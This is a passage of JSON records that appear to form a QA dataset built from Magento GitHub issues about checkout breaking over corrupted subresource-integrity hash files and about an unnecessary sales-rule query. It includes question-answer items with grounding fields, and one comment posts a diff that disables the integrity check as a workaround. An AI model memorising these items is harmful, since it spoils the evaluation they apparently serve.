[generated\\/code\\/Magento\\/Checkout\\/Controller\\/Index\\/Index\\/Interceptor.php:23]\\n#32 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->execute() called at [vendor\\/magento\\/framework\\/App\\/Action\\/Action.php:111]\\n#33 Magento\\\\Framework\\\\App\\\\Action\\\\Action->dispatch() called at [vendor\\/magento\\/module-checkout\\/Controller\\/Onepage.php:161]\\n#34 Magento\\\\Checkout\\\\Controller\\\\Onepage->dispatch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:58]\\n#35 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->___callParent() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:138]\\n#36 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-company\\/Plugin\\/Framework\\/App\\/Action\\/AbstractActionPlugin.php:65]\\n#37 Magento\\\\Company\\\\Plugin\\\\Framework\\\\App\\\\Action\\\\AbstractActionPlugin->aroundDispatch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#38 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:153]\\n#39 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->___callPlugins() called at [generated\\/code\\/Magento\\/Checkout\\/Controller\\/Index\\/Index\\/Interceptor.php:32]\\n#40 Magento\\\\Checkout\\\\Controller\\\\Index\\\\Index\\\\Interceptor->dispatch() called at [vendor\\/magento\\/framework\\/App\\/FrontController.php:245]\\n#41 Magento\\\\Framework\\\\App\\\\FrontController->getActionResponse() called at [vendor\\/magento\\/framework\\/App\\/FrontController.php:212]\\n#42 Magento\\\\Framework\\\\App\\\\FrontController->processRequest() called at [vendor\\/magento\\/framework\\/App\\/FrontController.php:146]\\n#43 Magento\\\\Framework\\\\App\\\\FrontController->dispatch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:58]\\n#44 Magento\\\\Framework\\\\App\\\\FrontController\\\\Interceptor->___callParent() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:138]\\n#45 Magento\\\\Framework\\\\App\\\\FrontController\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-store\\/App\\/FrontController\\/Plugin\\/RequestPreprocessor.php:99]\\n#46 Magento\\\\Store\\\\App\\\\FrontController\\\\Plugin\\\\RequestPreprocessor->aroundDispatch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#47 Magento\\\\Framework\\\\App\\\\FrontController\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-page-cache\\/Model\\/App\\/FrontController\\/BuiltinPlugin.php:72]\\n#48 Magento\\\\PageCache\\\\Model\\\\App\\\\FrontController\\\\BuiltinPlugin->aroundDispatch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#49 Magento\\\\Framework\\\\App\\\\FrontController\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:153]\\n#50 Magento\\\\Framework\\\\App\\\\FrontController\\\\Interceptor->___callPlugins() called at [generated\\/code\\/Magento\\/Framework\\/App\\/FrontController\\/Interceptor.php:23]\\n#51 Magento\\\\Framework\\\\App\\\\FrontController\\\\Interceptor->dispatch() called at [vendor\\/magento\\/framework\\/App\\/Http.php:116]\\n#52 Magento\\\\Framework\\\\App\\\\Http->launch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:58]\\n#53 Magento\\\\Framework\\\\App\\\\Http\\\\Interceptor->___callParent() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:138]\\n#54 Magento\\\\Framework\\\\App\\\\Http\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/module-application-performance-monitor\\/Plugin\\/ApplicationPerformanceMonitor.php:43]\\n#55 Magento\\\\ApplicationPerformanceMonitor\\\\Plugin\\\\ApplicationPerformanceMonitor->Magento\\\\ApplicationPerformanceMonitor\\\\Plugin\\\\{closure}() called at [vendor\\/magento\\/module-application-performance-monitor\\/Profiler\\/Profiler.php:59]\\n#56 Magento\\\\ApplicationPerformanceMonitor\\\\Profiler\\\\Profiler->doProfile() called at [vendor\\/magento\\/module-application-performance-monitor\\/Plugin\\/ApplicationPerformanceMonitor.php:41]\\n#57 Magento\\\\ApplicationPerformanceMonitor\\\\Plugin\\\\ApplicationPerformanceMonitor->aroundLaunch() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:135]\\n#58 Magento\\\\Framework\\\\App\\\\Http\\\\Interceptor->Magento\\\\Framework\\\\Interception\\\\{closure}() called at [vendor\\/magento\\/framework\\/Interception\\/Interceptor.php:153]\\n#59 Magento\\\\Framework\\\\App\\\\Http\\\\Interceptor->___callPlugins() called at [generated\\/code\\/Magento\\/Framework\\/App\\/Http\\/Interceptor.php:23]\\n#60 Magento\\\\Framework\\\\App\\\\Http\\\\Interceptor->launch() called at [vendor\\/magento\\/framework\\/App\\/Bootstrap.php:264]\\n#61 Magento\\\\Framework\\\\App\\\\Bootstrap->run() called at [pub\\/index.php:30]\\n\",\"url\":\"\\/checkout\\/\",\"script_name\":\"\\/index.php\",\"report_id\":\"fce417c9b1c65517a5d2bb538df133f6f0a3afacdff5f93714dfc6e0e664e6e7\"}`", "role": "comment"}, {"id": "c13", "author": "hostep", "timestamp": "2025-10-21T05:56:38Z", "body": "@bartoszkubicki: that's a different issue (but also caused by the same security patch release) and has to do with merging of assets, disabling merging should solve the issue for now. If you take a look at the file `pub/static/frontend/sri-hashes.json`, you should see it's corrupt and can't be decoded.\nThat merging issue is being discussed on Slack [over here](https://magentocommeng.slack.com/archives/CANPJTBC5/p1760622841479569), and should be linked to ticket AC-15866, no issue was created in github (yet) for this, sorry!", "role": "comment"}, {"id": "c14", "author": "bartoszkubicki", "timestamp": "2025-10-21T06:24:13Z", "body": "@hostep Haven't investigated the issue yet, but if anyone needs quick workaround that worked for us\n```\n\n--- a/Model/SubresourceIntegrityRepository.php\t2025-10-14 17:28:07\n+++ b/Model/SubresourceIntegrityRepository.php\t2025-10-20 14:29:22\n@@ -83,7 +83,8 @@\n      */\n     public function getByPath(string $path): ?SubresourceIntegrity\n     {\n-        return $this->getData()[$path] ?? null;\n+        return null;\n+        //return $this->getData()[$path] ?? null;\n     }\n\n     /**\n\n\n```\nPlease use carefully", "role": "comment"}, {"id": "c15", "author": "lupin0xf", "timestamp": "2025-10-21T07:07:06Z", "body": "Confirming on 2.4.6-p13, checkout page is white blank in production mode after upgrading to patch 13, but it works in developer mode, strange...", "role": "comment"}, {"id": "c16", "author": "kmajkowski-priv", "timestamp": "2025-10-21T11:03:25Z", "body": "I've experienced similar issue to @bartoszkubicki in M2.4.6-p3\n`[2025-10-15T16:06:11.137561+00:00] main.CRITICAL: InvalidArgumentException: Unable to unserialize value. Error: Syntax error in /home/ubuntu/prod/releases/134/vendor/magento/framework/Serialize/Serializer/Json.php:45\nStack trace:\n#0 /home/ubuntu/prod/releases/134/vendor/magento/module-csp/Model/SubresourceIntegrityRepository.php(173): Magento\\Framework\\Serialize\\Serializer\\Json->unserialize()\n#1 /home/ubuntu/prod/releases/134/vendor/magento/module-csp/Model/SubresourceIntegrityRepository.php(108): Magento\\Csp\\Model\\SubresourceIntegrityRepository->getData()\n#2 /home/ubuntu/prod/releases/134/vendor/magento/module-csp/Plugin/GenerateMergedAssetIntegrity.php(86): Magento\\Csp\\Model\\SubresourceIntegrityRepository->save()\n#3 /home/ubuntu/prod/releases/134/vendor/magento/framework/Interception/Interceptor.php(146): Magento\\Csp\\Plugin\\GenerateMergedAssetIntegrity->afterMerge()\n#4 /home/ubuntu/prod/releases/134/vendor/magento/framework/Interception/Interceptor.php(153): Magento\\Framework\\View\\Asset\\MergeStrategy\\FileExists\\Interceptor->Magento\\Framework\\Interception\\{closure}()\n#5 /home/ubuntu/prod/releases/134/generated/code/Magento/Framework/View/Asset/MergeStrategy/FileExists/Interceptor.php(23): Magento\\Framework\\View\\Asset\\MergeStrategy\\FileExists\\Interceptor->___callPlugins()\n#6 /home/ubuntu/prod/releases/134/vendor/magento/framework/View/Asset/Merged.php(111): Magento\\Framework\\View\\Asset\\MergeStrategy\\FileExists\\Interceptor->merge()\n#7 /home/ubuntu/prod/releases/134/vendor/magento/framework/View/Asset/Merged.php(183): Magento\\Framework\\View\\Asset\\Merged->initialize()\n#8 /home/ubuntu/prod/releases/134/vendor/magento/framework/View/Page/Config/Renderer.php(420): Magento\\Framework\\View\\Asset\\Merged->rewind()\n#9 /home/ubuntu/prod/releases/134/vendor/magento/framework/View/Page/Config/Renderer.php(297): Magento\\Framework\\View\\Page\\Config\\Renderer->renderAssetHtml()\n#10 /home/ubuntu/prod/releases/134/vendor/magento/framework/View/Page/Config/Renderer.php(284): Magento\\Framework\\View\\Page\\Config\\Renderer->renderAssetGroup()\n#11 /home/ubuntu/prod/releases/134/vendor/magento/framework/Interception/Interceptor.php(58): Magento\\Framework\\View\\Page\\Config\\Renderer->renderAssets()`\n\nThe root cause was corrupted JSON data returned by the SubresourceIntegrityRepository::getData() method.\nThe `$rawData = $this->storage->load($this->context);` call was returning an invalid JSON string that contained two closing curly braces (}), like this:\n`{\"_cache\\/merged\\/d01d992c7fceda533068d014d7953db2.min.js\":\"sha256-5GR\\/IpwsCWRCbz72l9n7w6uxMK5Ub9z9HSeN4kt0Ghw=\"}\"_cache\\/merged\\/aca3c66f08beb63d3e2bbc41c9dbfc63.min.js\":\"sha256-CwxyK9ROsIvHl45MvOk\\/G\\/KH0UzOyFbEpV3TmcP4L+8=\",\"_cache\\/merged\\/efe85b8038a1210518b4e897f6b18181.min.js\":\"sha256-Tw4JRIw6DL7ZXeUQfDHmUnkSCyIgCIFOXxx8A1Znv48=\",\"_cache\\/merged\\/e34bb276e71347c1a935dd9e49de6645.min.js\":\"sha256-Tw4JRIw6DL7ZXeUQfDHmUnkSCyIgCIFOXxx8A1Znv48=\",\"_cache\\/merged\\/9bde111c4afb1ad0b93d87a08689a071.min.js\":\"sha256-EKmfmDfyWRIReMSz8fLJZHgckZmxy4daepoQzRFEu\\/k=\",\"_cache\\/merged\\/d01d992c7fceda533068d014d7953db2.min.js\":\"sha256-5GR\\/IpwsCWRCbz72l9n7w6uxMK5Ub9z9HSeN4kt0Ghw=\",\"_cache\\/merged\\/6d94b026c3cfc1cf60edf940e405fe42.min.js\":\"sha256-QKkGxz\\/ygI2aH8yqLnEjaPY17VfBCXfzxGcJ\\/okE\\/Jw=\",\"_cache\\/merged\\/63f2b96e19ffeb5c2fb4c474eb18d41d.min.js\":\"sha256-zkc6srTcawNe+xXg4QyyNe9vYoYEoJrqQeTsz\\/JRQJs=\",\"_cache\\/merged\\/b9f84d76c0891f7c9fb3bff10c0ae2ef.min.js\":\"asha256-5GR\\/IpwsCWRCbz72l9n7w6uxMK5Ub9z9HSeN4kt0Ghw=\",\"_cache\\/merged\\/0f2a4ec46d7ec35c67a68f85eb74f5ea.min.js\":\"sha256-CwxyK9ROsIvHl45MvOk\\/G\\/KH0UzOyFbEpV3TmcP4L+8=\"}`", "role": "comment"}, {"id": "c17", "author": "magenizr", "timestamp": "2025-10-21T20:49:28Z", "body": "Hey folks,\n\nCan we please discuss the quality of the patch? We have some concerns about its current design ( high-level ):\n\n1. sri-hashes.json is being written to a static folder, which is read-only for most of us. ( https://github.com/magento/magento2/blob/2.4.6-p13/app/code/Magento/Csp/Model/SubresourceIntegrity/Storage/File.php#L81 ) and ( https://github.com/magento/magento2/blob/2.4.6-p13/app/code/Magento/Csp/Model/Deploy/Package/Processor/PostProcessor/Integrity.php#L86 )\n2. sri-hashes.json contains up to 1.8 MB data. The file size depends on the number of assets (themes) and configured locales. For European merchants, it\u2019s likely to be significantly larger.\n```\n[web@ssh-0 frontend]$ pwd\n/var/www/html/codebase/pub/static/frontend\n-rw-r--r--. 1 root root 1.8M Oct 21 02:34 sri-hashes.json\n```\n\n3. The block `Magento/Csp/Block/Sri/Hashes.php` loads the entire file into memory via `checkout_index_index.xml` and `$integrityRepository->getAll()`\n\n4. The file is being looped through and unserialized twice. ( https://github.com/magento/magento2/blob/2.4.6-p13/app/code/Magento/Csp/Block/Sri/Hashes.php#L76-L90 )\n\n**Suggestions:**\n\n- Why not limit the file creation to locales (e.g. sri-hashes-en_US.json, sri-hashes-de_DE.json) and only unserialize the relevant file?\n- Since the file can become quite large, wouldn\u2019t it make sense to maintain it in a database instead?", "role": "comment"}, {"id": "c18", "author": "scottfloranext", "timestamp": "2025-10-21T21:30:06Z", "body": "Hey unfortunately also blocked on releasing this security patch due to this error breaking my website platform's checkout. ", "role": "comment"}, {"id": "c19", "author": "alevashov", "timestamp": "2025-10-21T23:46:06Z", "body": "We also experienced the checkout got broken on Magento Open Source ver. 2.4.7-p8, similar with @bartoszkubicki \nWhat is very annoying that it broke after running fine for several days.\nClearing redis cache helped for some time, but in like 12 hours it broke again\n\nDisabling JS and CSS merge helped so far.", "role": "comment"}, {"id": "c20", "author": "Braham-M-Decade", "timestamp": "2025-10-22T10:06:20Z", "body": "Hello,\n\nSame issue with the 2.4.7-p8 patch \u2014 the checkout page is blank!\nThe mixin JS files are not being loaded.\n\nThe problem does not occur when the JS files are not minified.\n\nDo you know when this issue is expected to be resolved?", "role": "comment"}, {"id": "c21", "author": "nima1024m", "timestamp": "2025-10-22T12:12:33Z", "body": "This issue is extremely disruptive and has rendered our store running on version 2.4.6-p13 completely unusable, as the checkout page no longer functions properly. We were forced to revert to Patch 12 to restore functionality. Please address and resolve this issue as soon as possible.", "role": "comment"}, {"id": "c22", "author": "marvincaspar", "timestamp": "2025-10-22T13:14:03Z", "body": "Same issue here with version 2.4.8-p3. \n\nThe workaround is to disable **merge_files** and **enable_js_bundling**, but that should not be a permanent solution. I'm looking forward to a fix.", "role": "comment"}, {"id": "c23", "author": "shochdoerfer", "timestamp": "2025-10-22T13:52:50Z", "body": "Same issue here with 2.4.8-p3 and the latest patches. No problem since we patched a few days ago but hit the merchant hard a few hours ago ;(", "role": "comment"}, {"id": "c24", "author": "Hexmage", "timestamp": "2025-10-23T08:08:08Z", "body": "@engcom-Bravo The original post claims that this issue is S2. I strongly disagree, this issue is S1 at least. Because at a random moment your checkout can suddenly stop functioning. The fact that no hotfix patch or solution has been released after a week, is very disappointing.", "role": "comment"}, {"id": "c25", "author": "hostep", "timestamp": "2025-10-23T08:56:46Z", "body": "Fixes are in the works according [to messages in Slack](https://magentocommeng.slack.com/archives/CANPJTBC5/p1760622841479569) from yesterday:\n\n<img width=\"489\" height=\"140\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fad816ba-15e2-4d39-8ec0-a44b9ff16edb\" />", "role": "comment"}, {"id": "c26", "author": "Beraa995", "timestamp": "2025-10-27T11:07:38Z", "body": "I\u2019ve tested with version 2.4.7-p8, and the checkout process is breaking. Any updates or workarounds available?", "role": "comment"}, {"id": "c27", "author": "magenizr", "timestamp": "2025-10-27T21:57:12Z", "body": "We have a direct contact at Adobe who confirmed that the new patch is currently in QA. We should see updates soon.", "role": "comment"}, {"id": "c28", "author": "bonllavier", "timestamp": "2025-10-28T20:15:54Z", "body": "I've spent two days trying to determine if it was due to the P8 patch on my Magento Cloud 2.4.7 , and it seems to be. It only became corrupted when I switched my environment to production mode. It wasn't corrupted in developer mode. The only suspicions lie in the minification or deployment process. My checkout mixins weren't loading, and the checkout was partially blank. I escalated a ticket to Adobe support, giving them the details of the problem, but they haven't responded.\nThanks to the OP of this ticket, at least I know a solution is in progress and I'm not the only one with this problem.\nDisabling JavaScript merging and bundling isn't an option for us right now.", "role": "comment"}, {"id": "c29", "author": "magewiz", "timestamp": "2025-10-29T11:29:43Z", "body": "> [@Beraa995](https://github.com/Beraa995) Disable javascript merging and bundling.\n\ndoesn't help in my situation using 2.4.6-p13", "role": "comment"}, {"id": "c30", "author": "jessedw44", "timestamp": "2025-10-29T12:50:29Z", "body": "For the more recent commentors....  there was a solution which didn't require you to disable javascript bundling in this very thread\n\nhttps://github.com/magento/magento2/issues/40236#issuecomment-3424895588\n\nIts worked for me going on a week now.", "role": "comment"}, {"id": "c31", "author": "boldhedgehog", "timestamp": "2025-10-30T09:52:48Z", "body": "From my perspective, this looks like a concurrency issue.\n\nThe real solution to this issue is to write the data to file storage with locking here:\nhttps://github.com/magento/magento2/blob/2.4-develop/app/code/Magento/Csp/Model/SubresourceIntegrity/Storage/File.php#L84\n\n```php\nreturn (bool) $staticDir->writeFile(\n                $this->resolveFilePath($context),\n                $data,\n                'w'\n            );\n```\nshould be:\n\n```php\nreturn (bool) $staticDir->writeFile(\n                $this->resolveFilePath($context),\n                $data,\n                'w',\n                true\n            );\n```\n", "role": "comment"}, {"id": "c32", "author": "hryvinskyi", "timestamp": "2025-11-03T11:37:40Z", "body": "I have created patch for this issue:\nhttps://gist.github.com/hryvinskyi/3df14e684d67bd8f7d278f4340ab133b\n\n**Update: This patch fixes both issues:**\n\nMissing `static.min.js` and `mixins.min.js` when bundling and minification are enabled\nCorrupted `sri-hashes.json` files caused by concurrent write race conditions", "role": "comment"}, {"id": "c33", "author": "hostep", "timestamp": "2025-11-03T13:05:00Z", "body": "Latest update from [Slack](https://magentocommeng.slack.com/archives/CANPJTBC5/p1762174922083479?thread_ts=1760559512.935429&cid=CANPJTBC5):\n\n<img width=\"432\" height=\"104\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f0e8711d-fbbe-497f-afb3-634e73f0dfb4\" />", "role": "comment"}, {"id": "c34", "author": "MartynasZukovasOut", "timestamp": "2025-11-04T13:03:41Z", "body": "I do see fix for this issue - AC-15867 on https://experienceleague.adobe.com/tools/commerce-quality-patches/index.html\nbut when I update module to the 1.1.73v - I cant find that patch. Maybe something was not released yet? ", "role": "comment"}, {"id": "c35", "author": "zaxkh", "timestamp": "2025-11-04T13:09:29Z", "body": "> I do see fix for this issue - AC-15867 on https://experienceleague.adobe.com/tools/commerce-quality-patches/index.html but when I update module to the 1.1.73v - I cant find that patch. Maybe something was not released yet?\n\nhttps://github.com/magento/quality-patches/commit/b5333ad787f6946c2ac0452ede276a6f7a7c837d", "role": "comment"}, {"id": "c36", "author": "davidwindell", "timestamp": "2025-11-04T16:27:26Z", "body": "That patch doesn't seem to address the file locking issue that @hryvinskyi patch does. Does anyone have any thoughts on that in terms of whether the official patch will address the corrupted sri-hashes.json issue?\n\nThere is also an identical issue when merged JS is enabled (with the official patch above applied...so still more work to do).", "role": "comment"}, {"id": "c37", "author": "sathyalybe", "timestamp": "2025-11-05T12:57:54Z", "body": "Looks like patch is available under master branch but not under tag 1.1.73v  @zaxkh @MartynasZukovasOut ", "role": "comment"}, {"id": "c38", "author": "boldhedgehog", "timestamp": "2025-11-05T13:04:58Z", "body": "@davidwindell these are 2 different issues. https://github.com/magento/magento2/issues/40247 should not have been closed as a duplicate.", "role": "comment"}, {"id": "c39", "author": "Yoann-D", "timestamp": "2025-11-05T16:50:49Z", "body": "Hello,\n\nI also discovered another issue when the \"Compact\" strategy is enabled.\n\nDuring checkout, the JS files inserted into a layout don't point to /static/base/Magento/base/default/file.js but directly to the current theme /static/frontend/MyTheme/Theme-v2/fr_FR/file.js.\n\nThis triggers a JS error and blocks the checkout.\n\nTo fix the problem, I changed the method for including the JS files.\n\n<img width=\"1595\" height=\"303\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bce4810d-c96e-4628-b0ea-21295404f71f\" />\n\nAnd I have a call in a template file\n\n<img width=\"985\" height=\"276\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a088b713-caeb-4d65-a43f-d4dbbe15f9ca\" />\n\n\n\nTo reproduce:\n\nSwitch to Production Mode\n\n- bin/magento se:up\n- bin/magento se:di:co\n- bin/magento setup:static-content:deploy fr_FR --theme=MyTheme/Theme-v2 -s compact", "role": "comment"}, {"id": "c40", "author": "hostep", "timestamp": "2025-11-05T17:36:12Z", "body": "> > I do see fix for this issue - AC-15867 on https://experienceleague.adobe.com/tools/commerce-quality-patches/index.html but when I update module to the 1.1.73v - I cant find that patch. Maybe something was not released yet?\n\n> https://github.com/magento/quality-patches/commit/b5333ad787f6946c2ac0452ede276a6f7a7c837d\n\nBe aware when trying to use this patch, apparently it's not finalized yet, [new info from Slack](https://magentocommeng.slack.com/archives/CANPJTBC5/p1762363955405539?thread_ts=1760559512.935429&cid=CANPJTBC5):\n\n<img width=\"1348\" height=\"296\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/69310bfc-2115-47ad-8216-2dfd4260ab28\" />", "role": "comment"}], "qa_pairs": [{"qid": "magento/magento2/issue/40236#1", "question": "In Magento 2.4.8-p3 with the CSP module enabled, production mode, and JavaScript bundling and minification enabled, checkout stops loading `static.min.js` and `mixins.min.js`. Steps to reproduce:\n\n1. Set store to production mode\n2. Enable bundling and minify options for JS\n3. Deploy the content\n4. Add item to cart and browse to checkout\n5. Check to see if static.min.js and mixins.min.js were loaded onto the page\n\nExpected result: the JS files are added to the `<head>` section and loaded on the page.\n\nActual result: both files are missing from the page.\n\nIt looks related to recent changes in `Magento/Csp/Model/Deploy/Package/Processor/PostProcessor/Integrity.php` that write all integrity hashes during deployment, plus the new `GenerateBundleAssetIntegrity.php`. The hashes are written using the non-minified filenames `static.js` and `mixins.js` instead of the deployed `.min.js` filenames. Previously, `sri-hashes.json` only contained hashes for `requirejs-config.min.js`, so bundle files stayed in the same group and the Config block could add JS files correctly. Now the bundle hashes are correctly found with `.min.js` names and put in separate asset groups, but hashes for `static.min.js` and `mixins.min.js` are looked up as `static.js` and `mixins.js`, so Magento tries to insert them into an existing JS asset group where the bundle files are not present and fails to add them. The only workaround found is disabling JS minification or bundling.\n\nIs there a patch or fix for this SRI/bundling/minification issue?", "answer": "A patch was created for this issue at https://gist.github.com/hryvinskyi/3df14e684d67bd8f7d278f4340ab133b. The maintainer stated that the patch fixes the missing `static.min.js` and `mixins.min.js` issue when bundling and minification are enabled, and also fixes corrupted `sri-hashes.json` files caused by concurrent write race conditions.", "knowledge_type": "grounded", "grounding_sources": ["https://gist.github.com/hryvinskyi/3df14e684d67bd8f7d278f4340ab133b"], "answer_grounded_in": "c32", "leak_flags": []}], "answer_in_thread_refs": ["https://gist.github.com/hryvinskyi/3df14e684d67bd8f7d278f4340ab133b"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T07:47:58.988040Z", "review_note": ""}
{"id": "magento/magento2/issue/40226", "repo": "magento/magento2", "number": 40226, "title": "Magento\\SalesRule\\Model\\Plugin\\QuoteConfigProductAttributes::afterGetProductAttributes getting triggered on all Cart Queries", "url": "https://github.com/magento/magento2/issues/40226", "state": "closed", "created_at": "2025-10-14T06:02:45Z", "closed_at": "2026-06-05T06:49:55Z", "labels": ["Issue: Confirmed", "Progress: PR Created", "Component: SalesRule", "Triage: Dev.Experience", "Reproduced on 2.4.x", "Priority: P3", "Reported on 2.4.x", "Area: Catalog"], "reporter": "senthilengg", "security_topic": "performance impact of unconditional sales rule attribute loading", "qa_summary": "Whether the cart-query salesrule_product_attributes loading is an expected performance issue and what code path triggers it, anchored on the linked Magento source file `QuoteConfigProductAttributes.php` and the maintainer\u2019s explanation in comment c4.", "question_comment_id": "c8", "answer_comment_id": "c4", "question_author": "Vishrootways", "answer_author": "engcom-Hotel", "answerer_role": "commenter", "artifacts_needed": ["code", "documentation", "issue_tracker"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": ["e044f7421166d58dc74c837bf90b124eb99bb9a0"], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.7124999999999999, "comments": [{"id": "c0", "author": "senthilengg", "timestamp": "2025-10-14T06:02:45Z", "body": "### Preconditions and environment\n\n- All Magento versions\n- salesrule_product_attributes table select getting triggered and salesrule attribute data retrieved from EAV eventhough collectTotals not fired\n\n### Steps to reproduce\n\n1. Add products to cart (collectTotals should have completed here)\n2. Enable DB Query Log\n3. Hit the cart page URL\n4. To confirm the query fired run , cat var/log/db.log | grep \"salesrule_product_attribute\" from magento root\n\n### Expected result\n\nsalesrule_product_attribute query should be fired only when collectTotal happening\n\n### Actual result\n\nsalesrule_product_attribute query fired always\n\n### Additional information\n\nFor large catalog and companies who run lot of promotions will get benefit out of it.\n\n### Release note\n\n_No response_\n\n### Triage and priority\n\n- [ ] Severity: **S0** _- Affects critical data or functionality and leaves users without workaround._\n- [ ] Severity: **S1** _- Affects critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S2** _- Affects non-critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S3** _- Affects non-critical data or functionality and does not force users to employ a workaround._\n- [ ] Severity: **S4** _- Affects aesthetics, professional look and feel, \u201cquality\u201d or \u201cusability\u201d._", "role": "body"}, {"id": "c1", "author": "m2-assistant", "timestamp": "2025-10-14T06:02:48Z", "body": "Hi @senthilengg. Thank you for your report. \nTo speed up processing of this issue, make sure that the issue is reproducible on the vanilla Magento instance following **Steps to reproduce**. \n- For more details, review the [Magento Contributor Assistant](https://developer.adobe.com/commerce/contributor/guides/code-contributions/#contributor-assistant) documentation.\n- Add a comment to [assign the issue](https://developer.adobe.com/commerce/contributor/guides/code-ontributions/#assigning-an-issue): `@magento I am working on this` \n- To learn more about issue processing workflow, refer to the [Code Contributions](https://developer.adobe.com/commerce/contributor/guides/code-contributions/).\n---\nJoin [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel. \n :warning: According to the Magento Contribution requirements, all issues must go through the Community Contributions Triage process. Community Contributions Triage is a public meeting. \n:clock10: You can find the schedule on the [Magento Community Calendar page](https://www.adobe.io/open/magento/calendar).\n:telephone_receiver: The triage of issues happens in the queue order. If you want to speed up the delivery of your contribution, join the Community Contributions Triage session to discuss the appropriate ticket.", "role": "comment"}, {"id": "c2", "author": "engcom-Hotel", "timestamp": "2025-10-17T09:19:05Z", "body": "Hello @senthilengg,\n\nThank you for the report and collaboration!\n\nWe have gone through with the issue and the scenario mentioned is reproducible for us. But seems that this is an expected behaviour due to the below reason:\n\nIt seems that the scenario is calling from the below pulgin:\nhttps://github.com/magento/magento2/blob/e044f7421166d58dc74c837bf90b124eb99bb9a0/app/code/Magento/SalesRule/Model/Plugin/QuoteConfigProductAttributes.php#L41-L49\n\nThis plugin intercepts every call to `getProductAttributes()`, which happens whenever quote items are loaded\u2014not just during totals collection. The `salesrule_product_attribute` table stores which product attributes are used in active sales rule conditions/actions (e.g., \"If product color = red, apply 10% discount\"). These attributes must be loaded with the products before collectTotals() runs, because:\n\n- Sales rules validation happens during totals collection\n- The rule conditions need access to these product attributes\n- Product collections for quote items are built before totals collection\n\nLet us know if we missed anything while analysing the issue.\n\nThank you", "role": "comment"}, {"id": "c3", "author": "senthilengg", "timestamp": "2025-10-17T10:34:48Z", "body": "@engcom-Hotel  If there is no need of collectTotals to run which is a heavy process why would this plugin. Need to run and retrieve data.\n\nAlso on a million product catalog this table can contain few 100k rows which will add load time and leads to performance bottleneck. So it\u2019s better to address this. ", "role": "comment"}, {"id": "c4", "author": "engcom-Hotel", "timestamp": "2025-10-23T10:00:08Z", "body": "Hello @senthilengg, you make an excellent point. After deeper analysis, I agree this is a performance issue.\n\n**The Problem:**\nThe plugin fires on **every** quote item collection load (line 262 in `Quote\\Model\\ResourceModel\\Quote\\Item\\Collection.php`), not just during totals collection. This means:\n\n1. Viewing cart page \u2192 Plugin fires \u2192 Queries `salesrule_product_attribute` table\n2. For catalogs with 100k+ rows in this table, this adds unnecessary load time\n3. These attributes are loaded even when they won't be used (no totals recalculation)\n\n**Performance Impact:**\n- Unnecessary DB query on every cart view\n- Additional EAV attribute loading overhead  \n- Scales poorly with number of rules \u00d7 websites \u00d7 customer groups \u00d7 attributes\n\n**Potential Solutions:**\n1. **Lazy Load**: Only load salesrule attributes when `collectTotals()` is actually triggered\n2. **Conditional Check**: Add flag to determine if rules need evaluation before loading attributes\n3. **Caching**: Cache the active attributes per store/customer group to avoid repeated DB queries\n4. **Move Loading Point**: Load attributes closer to rule validation in totals collection\n\nHence confirming the issue. \n\nThank you for bringing this issue to our attention. If you have a potential solution, we encourage you to submit a pull request. Your contributions significantly enhance Magento Open Source for everyone. Should you need any assistance, please don't hesitate to ask!", "role": "comment"}, {"id": "c5", "author": "m2-assistant", "timestamp": "2025-10-24T19:41:05Z", "body": "Hi @Copilot. Thank you for working on this issue. \nLooks like this issue is already verified and confirmed. But if you want to validate it one more time, please, go though the following instruction:\n- 1. Add/Edit `Area: XXXXX` label to the ticket, indicating the functional areas it may be related to.\n- 2. Verify that the issue is reproducible on `2.4-develop` branch<details><summary>Details</summary>- If the issue is reproducible on `2.4-develop` branch, please, add the label `Reproduced on 2.4.x`.<br/>- If the issue is not reproducible, add your comment that issue is not reproducible and close the issue and **_stop verification process here_**!</details>\n- 3. If the issue is not relevant or is not reproducible any more, feel free to close it.\n\n---\n-  Join [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel.", "role": "comment"}, {"id": "c6", "author": "github-jira-sync-bot", "timestamp": "2026-02-24T05:54:45Z", "body": ":white_check_mark: Jira issue https://jira.corp.adobe.com/browse/AC-16559 is successfully created 